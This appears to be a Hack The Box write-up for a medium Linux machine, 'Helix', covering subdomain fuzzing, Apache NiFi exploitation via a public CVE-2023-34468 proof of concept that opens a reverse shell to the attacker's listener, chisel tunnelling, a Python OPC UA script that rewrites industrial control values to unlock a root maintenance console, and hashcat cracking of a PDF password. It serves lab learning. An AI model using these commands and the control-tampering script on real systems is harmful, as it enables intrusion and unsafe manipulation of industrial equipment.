# Helix

**Target IP:** `10.129.245.123`  
**Hostname:** `helix.htb`  
**Platform:** `Linux`  
**Difficulty:** `Medium`

---

## 1. Enumeration

### Port Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
```

Initial scans seem to show this is a classic HTTP + SSH combo, web vulnerabilities are most common so we start off by looking here.

### Web Reconnaissance

Viewing the site, it appears to be an industrial site offering some form of automation/cyber security based product:
![[Pasted image 20260513134538.png]]

On the site there is a button to "start a project" allowing user input which appears to be sent perhaps to an admin:
![[Pasted image 20260513134633.png]]

There is also the option to request a call:
![[Pasted image 20260513134705.png]]

Viewing an error page discloses that the site is running nginx/1.18.0:
![[Pasted image 20260513134737.png]]

Directory fuzzing:

```bash
feroxbuster --url http://helix.htb/
```
However, this returns nothing:
![[Pasted image 20260513134901.png]]

Subdomain / vhost enumeration:

```bash
ffuf -c -u http://10.129.245.123 -H "Host: FUZZ.helix.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 302
```

This identifies one subdomain - **flow**:
![[Pasted image 20260513135035.png]]

### Additional Enumeration

Now we have found a new subdomain, we can add this to our `/etc/hosts` and enumerate here.

Viewing the site, it appears to be some out of the box software, allowing creations of process flow diagrams:
![[Pasted image 20260513135143.png]]

Viewing the "about" section tells us this is Apache NiFi 1.21.0 and gives us some more information about how it works:
![[Pasted image 20260513135333.png]]

Performing a quick google search for this version seems to say it may be vulnerable to RCE (CVE-2023-34468.)

---

## 2. Initial Foothold — CVE-2023-34468

The version of Apache NiFi in use was found to have an RCE vulnerability in the DBCPConnectionPool and HikariCPConnectionPool controller services, which allowed H2 JDBC Database URL to be entered and RCE to be achieved.

**Reference / PoC:** https://github.com/Al3xx-sec/CVE-2023-34468-POC

### Exploitation

Using the PoC found, we can attempt to gain a shell. First I spin up a penelope listener, then I run the script:

```bash
python3 CVE-2023-34468_poc.py --target http://flow.helix.htb --lhost 10.10.14.2 --lport 4444 --cleanup
```

This drops us a shell running as user "nifi":
![[Pasted image 20260513140141.png]]

---

## 3. Post foothold enumeration

After gaining a shell, I look into the `/etc/passwd` file and discover there is only one user other than root with a valid shell - **operator**. Therefore this is likely our user target:

![[Pasted image 20260513140335.png]]

We cannot directly access this users home directory, so we will likely need to find some credentials or exploitable service. 

At this stage I ran linpeas to automate some of the enumeration while I hunted myself, and it discovered an open internal service running on port 8081:
![[Pasted image 20260513141458.png]]

Curling this service reveals it is a maintenance webpage:
![[Pasted image 20260513141529.png]]
### Port forwarding

I would like to view this site on my attacker machine, so I utilise chisel to reverse port forward.  

On attacker host:

```bash
chisel server --socks5 -reverse -p 8081 -v
```

On target box:

```bash
chmod +x chisel
./chisel client 10.10.14.2:8081 R:9050:socks
```

### Web enumeration

Viewing the page, like I expected, it appears to be some form of maintenance window:
![[Pasted image 20260513141817.png]]

It also gives a link to another internal service like so:
`OPC UA (internal): opc.tcp://127.0.0.1:4840/helix/`

I use gemini to write me a script to interact with this service, and we can grab the following values:
![[Pasted image 20260513144444.png]]

However, this doesn't seem to be useful and seems to just be supplying the values provided on the web page.

Going back to the web page, I notice this section, which seems to state if the temperature is very high, the maintenance window will be displayed. Therefore if we can write a high temperature, we may be able to expose this window:
![[Pasted image 20260513144641.png]]

I discover I am unable to write directly to temperature, however I can add a large offset, to increase it. However, this still doesn't open the maintenance window:
![[Pasted image 20260513145501.png]]

Through setting the mode to MAINTENANCE, the offset to +20 and the test override to true, I am able to grant the privileged maintenance window, but nothing appears to change, perhaps I am missing something on the box side:
![[Pasted image 20260513150731.png]]

This was the script I used:
```python
import asyncio
from asyncua import Client, ua

async def main():
    url = "opc.tcp://127.0.0.1:4840/helix/"
    
    async with Client(url=url) as client:
        print(f"Connecting to {url}...")
        
        # Define the Target Nodes
        override_node = client.get_node("ns=2;i=13")
        offset_node = client.get_node("ns=2;i=6")
        mode_node = client.get_node("ns=2;i=12")
        temp_node = client.get_node("ns=2;i=4")

        try:
            # 1. Enable Test Override (The "Gatekeeper")
            print("[1/3] Enabling Test Override...")
            await override_node.write_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))

            # 2. Set Mode to MAINTENANCE
            # Note: We use VariantType.String for the Mode node
            print("[2/3] Switching System Mode to 'MAINTENANCE'...")
            await mode_node.write_value(ua.DataValue(ua.Variant("MAINTENANCE", ua.VariantType.String)))

            # 3. Apply Calibration Offset
            print("[3/3] Applying +20.0 Calibration Offset...")
            await offset_node.write_value(ua.DataValue(ua.Variant(20.0, ua.VariantType.Double)))

            # Final Verification
            final_temp = await temp_node.read_value()
            final_mode = await mode_node.read_value()
            print("-" * 30)
            print("Successfully reconfigured the Helix system:")
            print(f"Current Mode: {final_mode}")
            print(f"Reported Temperature: {final_temp}")
            print("-" * 30)

        except Exception as e:
            print(f"Critical Failure in the Attack Chain: {e}")

if __name__ == "__main__":
    asyncio.run(main())
```

---

## 4. User Shell

Going back to the box, as I think something is missing, I hunt around some more in the nifi folder and eventually discover an SSH key seemingly for operator:
![[Pasted image 20260513151024.png]]

Now we can connect using this key:
```bash
ssh operator@helix.htb -i key
```

And grab the user flag:
![[Pasted image 20260513153134.png]]

---

## 5. Privilege Escalation

### Enumeration

With our shell, I ran a quick check to see if we can run anything as root:
```bash
sudo -l
```
![[Pasted image 20260513153238.png]]

This discovered we could run some form of maintenance console as root. When running this, we get told it is closed, however, my assumption is we can open it using the steps we performed earlier:
![[Pasted image 20260513153326.png]]

### Activating the maintenance window

I ran the script that I wrote earlier, then ran the maintenance console program in the context of sudo, and this granted me a root shell and we were able to get the root flag:
![[Pasted image 20260513153520.png]]
### Post root enumeration

When I was in the home directory as operator, I noticed there was a pdf named 'Operator Control & Safety Guide.pdf'. When downloading this locally and trying to open it requires a password.

Convert PDF to hashcat format:
```bash
python3 pdf2hashcat.py Operator\ Control\ \&\ Safety\ Guide.pdf > hashcat
```

Crack:
```bash
hashcat -a 0 hashcat /usr/share/wordlists/rockyou.txt -m 10700
```

This drops the password as **operator1**:
![[Pasted image 20260513154953.png]]

We can then view the PDF and see it gives explicit instructions on how to get the maintenance panel, which would've probably been easier to know earlier!
![[Pasted image 20260513154844.png]]

---

## Summary
| Step                 | Technique / Method                                                                                          |
| -------------------- | ----------------------------------------------------------------------------------------------------------- |
| Initial access       | CVE-2023-34468 — Apache NiFi RCE via vulnerable H2 JDBC configuration                                       |
| Foothold             | Reverse shell obtained as `nifi` using public PoC                                                           |
| Internal access      | Discovered internal maintenance service and accessed it via `chisel` port forwarding                        |
| User shell           | Found SSH private key for `operator` in NiFi files and logged in via SSH                                    |
| Privilege escalation | Enabled maintenance mode through OPC UA manipulation, then ran maintenance console with `sudo` to gain root |
